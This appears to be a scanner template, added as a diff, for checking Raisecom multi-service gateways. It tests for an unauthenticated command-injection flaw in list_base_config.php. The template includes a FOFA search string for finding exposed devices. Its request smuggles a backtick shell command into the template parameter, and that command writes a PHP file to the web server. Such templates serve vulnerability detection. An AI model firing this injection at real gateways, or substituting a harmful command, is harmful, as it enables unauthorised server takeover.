@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - PHP Version
+            - phpinfo()
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{username}}.php%60 HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /tmp/{{username}}.php HTTP/1.1
+          Host: {{Hostname}}
+id: RAISECOM-list_base_config-rce
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/images/raisecom/back.gif" && title=="Web user login"
+        瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 瑞斯康达-多业务智能网关 list_base_config.php 远程命令执行漏洞
+    reference:
+        - https://superhero.blog.csdn.net/article/details/140826601
+    severity: high
+    tags:
+        - RCE
+variables:
+    username: '{{to_lower(rand_base(6))}}'
